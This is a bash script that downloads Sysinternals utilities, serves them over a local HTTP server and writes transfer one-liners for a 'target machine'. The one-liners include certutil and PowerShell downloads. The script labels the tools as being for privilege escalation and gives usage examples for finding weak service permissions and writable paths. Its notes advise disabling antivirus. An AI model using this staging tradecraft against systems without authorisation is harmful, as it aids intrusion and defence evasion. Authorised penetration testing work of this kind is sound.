#!/bin/bash

# Sysinternals Tools Download & Server Script
# This script downloads essential Sysinternals tools, serves them on a random port,
# and generates one-liners for copying to isolated machines

set -e

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
echo -e "${BLUE}"
cat << "EOF"
╔═══════════════════════════════════════════════════════════╗
║     Sysinternals Tools Download & Server Script          ║
║     Perfect for Offline/Isolated Machine Transfers       ║
╚═══════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

# Configuration
TOOLS_DIR="sysinternals_tools"
DOWNLOAD_DIR="$TOOLS_DIR/downloads"
PORT=$(shuf -i 8000-9999 -n 1)
SERVER_IP=$(hostname -I | awk '{print $1}')

# Essential Sysinternals tools for privilege escalation
declare -A TOOLS=(
    ["accesschk.exe"]="https://live.sysinternals.com/accesschk.exe"
    ["accesschk64.exe"]="https://live.sysinternals.com/accesschk64.exe"
    ["procmon.exe"]="https://live.sysinternals.com/Procmon.exe"
    ["procmon64.exe"]="https://live.sysinternals.com/Procmon64.exe"
    ["autoruns.exe"]="https://live.sysinternals.com/autoruns.exe"
    ["autoruns64.exe"]="https://live.sysinternals.com/autoruns64.exe"
    ["autorunsc.exe"]="https://live.sysinternals.com/autorunsc.exe"
    ["autorunsc64.exe"]="https://live.sysinternals.com/autorunsc64.exe"
    ["procexp.exe"]="https://live.sysinternals.com/procexp.exe"
    ["procexp64.exe"]="https://live.sysinternals.com/procexp64.exe"
    ["sigcheck.exe"]="https://live.sysinternals.com/sigcheck.exe"
    ["sigcheck64.exe"]="https://live.sysinternals.com/sigcheck64.exe"
    ["psexec.exe"]="https://live.sysinternals.com/PsExec.exe"
    ["psexec64.exe"]="https://live.sysinternals.com/PsExec64.exe"
    ["pslist.exe"]="https://live.sysinternals.com/pslist.exe"
    ["pslist64.exe"]="https://live.sysinternals.com/pslist64.exe"
    ["handle.exe"]="https://live.sysinternals.com/handle.exe"
    ["handle64.exe"]="https://live.sysinternals.com/handle64.exe"
    ["strings.exe"]="https://live.sysinternals.com/strings.exe"
    ["strings64.exe"]="https://live.sysinternals.com/strings64.exe"
    ["tcpview.exe"]="https://live.sysinternals.com/Tcpview.exe"
    ["sysmon.exe"]="https://live.sysinternals.com/Sysmon.exe"
    ["sysmon64.exe"]="https://live.sysinternals.com/Sysmon64.exe"
)

# Create directory structure
echo -e "${YELLOW}[*] Creating directory structure...${NC}"
mkdir -p "$DOWNLOAD_DIR"
cd "$TOOLS_DIR"

# Download tools
echo -e "${YELLOW}[*] Downloading Sysinternals tools...${NC}"
FAILED_DOWNLOADS=()

for tool in "${!TOOLS[@]}"; do
    url="${TOOLS[$tool]}"
    if [ -f "downloads/$tool" ]; then
        echo -e "${GREEN}[✓] $tool already exists, skipping...${NC}"
    else
        echo -e "${BLUE}[→] Downloading $tool...${NC}"
        if wget -q --show-progress -O "downloads/$tool" "$url" 2>/dev/null; then
            echo -e "${GREEN}[✓] Downloaded $tool${NC}"
        else
            echo -e "${RED}[✗] Failed to download $tool${NC}"
            FAILED_DOWNLOADS+=("$tool")
        fi
    fi
done

# Summary of downloads
echo ""
echo -e "${GREEN}════════════════════════════════════════════════════════${NC}"
TOTAL_TOOLS=${#TOOLS[@]}
SUCCESSFUL=$((TOTAL_TOOLS - ${#FAILED_DOWNLOADS[@]}))
echo -e "${GREEN}[✓] Successfully downloaded: $SUCCESSFUL/$TOTAL_TOOLS tools${NC}"

if [ ${#FAILED_DOWNLOADS[@]} -gt 0 ]; then
    echo -e "${RED}[✗] Failed downloads: ${FAILED_DOWNLOADS[*]}${NC}"
fi
echo -e "${GREEN}════════════════════════════════════════════════════════${NC}"
echo ""

# Generate transfer commands script
COMMANDS_FILE="transfer_commands.txt"
echo -e "${YELLOW}[*] Generating transfer commands...${NC}"

cat > "$COMMANDS_FILE" << EOL
╔═══════════════════════════════════════════════════════════════════════════╗
║             SYSINTERNALS TOOLS - TRANSFER COMMANDS                        ║
║             Server: http://${SERVER_IP}:${PORT}                                   ║
╚═══════════════════════════════════════════════════════════════════════════╝

=============================================================================
METHOD 1: PowerShell (Windows) - Download Individual Tools
=============================================================================

EOL

# PowerShell commands for each tool
for tool in "${!TOOLS[@]}"; do
    if [ -f "downloads/$tool" ]; then
        echo "# Download $tool" >> "$COMMANDS_FILE"
        echo "Invoke-WebRequest -Uri http://${SERVER_IP}:${PORT}/$tool -OutFile $tool" >> "$COMMANDS_FILE"
        echo "" >> "$COMMANDS_FILE"
    fi
done

cat >> "$COMMANDS_FILE" << EOL

=============================================================================
METHOD 2: PowerShell - Download ALL Tools at Once
=============================================================================

\$tools = @(
EOL

# Create array for PowerShell
for tool in "${!TOOLS[@]}"; do
    if [ -f "downloads/$tool" ]; then
        echo "    \"$tool\"," >> "$COMMANDS_FILE"
    fi
done

cat >> "$COMMANDS_FILE" << 'EOL'
)
foreach ($tool in $tools) {
    Invoke-WebRequest -Uri "http://${SERVER_IP}:${PORT}/$tool" -OutFile $tool
    Write-Host "Downloaded: $tool" -ForegroundColor Green
}

=============================================================================
METHOD 3: certutil (Alternative Windows Method)
=============================================================================

EOL

for tool in "${!TOOLS[@]}"; do
    if [ -f "downloads/$tool" ]; then
        echo "certutil -urlcache -f http://${SERVER_IP}:${PORT}/$tool $tool" >> "$COMMANDS_FILE"
    fi
done

cat >> "$COMMANDS_FILE" << EOL

=============================================================================
METHOD 4: wget (Linux/Windows with wget)
=============================================================================

EOL

for tool in "${!TOOLS[@]}"; do
    if [ -f "downloads/$tool" ]; then
        echo "wget http://${SERVER_IP}:${PORT}/$tool" >> "$COMMANDS_FILE"
    fi
done

cat >> "$COMMANDS_FILE" << EOL

=============================================================================
METHOD 5: curl (Cross-platform)
=============================================================================

EOL

for tool in "${!TOOLS[@]}"; do
    if [ -f "downloads/$tool" ]; then
        echo "curl -O http://${SERVER_IP}:${PORT}/$tool" >> "$COMMANDS_FILE"
    fi
done

cat >> "$COMMANDS_FILE" << EOL

=============================================================================
METHOD 6: Batch Script - Save as download_tools.bat
=============================================================================

@echo off
echo Downloading Sysinternals Tools...
EOL

for tool in "${!TOOLS[@]}"; do
    if [ -f "downloads/$tool" ]; then
        echo "powershell -Command \"Invoke-WebRequest -Uri 'http://${SERVER_IP}:${PORT}/$tool' -OutFile '$tool'\"" >> "$COMMANDS_FILE"
    fi
done

echo "echo All tools downloaded!" >> "$COMMANDS_FILE"
echo "pause" >> "$COMMANDS_FILE"

cat >> "$COMMANDS_FILE" << EOL

=============================================================================
QUICK USAGE EXAMPLES (After Download)
=============================================================================

# Check service permissions
accesschk.exe -uwcqv "Authenticated Users" *
accesschk64.exe -uwcqv * /accepteula

# Find writable directories
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs Users c:\

# Monitor process activity (DLL hijacking)
procmon.exe /accepteula /quiet /minimized /backingfile procmon.pml

# Check autoruns for persistence
autorunsc.exe -a * -c -h -s -v

# Verify file signatures
sigcheck.exe -u -e c:\windows\system32

# List processes with detailed info
pslist.exe -x

# Check open handles
handle.exe

=============================================================================
NOTES:
- Run PowerShell as Administrator if download fails
- Disable Windows Defender/AV temporarily if blocked
- Use 32-bit or 64-bit versions based on target system
- Accept EULA with /accepteula flag on first run
=============================================================================

EOL

echo -e "${GREEN}[✓] Transfer commands saved to: $COMMANDS_FILE${NC}"

# Create a simple HTTP server script
SERVER_SCRIPT="start_server.sh"
cat > "$SERVER_SCRIPT" << 'EOFSERVER'
#!/bin/bash
PORT=$1
cd downloads
echo -e "\033[1;32m"
echo "════════════════════════════════════════════════════════"
echo "  HTTP Server Running on Port: $PORT"
echo "  Serving directory: $(pwd)"
echo "  Press Ctrl+C to stop"
echo "════════════════════════════════════════════════════════"
echo -e "\033[0m"
python3 -m http.server $PORT
EOFSERVER

chmod +x "$SERVER_SCRIPT"

# Start the server
echo ""
echo -e "${GREEN}════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}[✓] Setup complete!${NC}"
echo -e "${GREEN}════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${YELLOW}Server Configuration:${NC}"
echo -e "  IP Address: ${BLUE}$SERVER_IP${NC}"
echo -e "  Port: ${BLUE}$PORT${NC}"
echo -e "  Base URL: ${BLUE}http://${SERVER_IP}:${PORT}${NC}"
echo ""
echo -e "${YELLOW}Quick Start:${NC}"
echo -e "  1. View transfer commands: ${BLUE}cat $COMMANDS_FILE${NC}"
echo -e "  2. Server will start automatically below"
echo -e "  3. On target machine, use commands from $COMMANDS_FILE"
echo ""
echo -e "${YELLOW}Starting HTTP server...${NC}"
echo ""

# Start server
cd downloads
python3 -m http.server $PORT
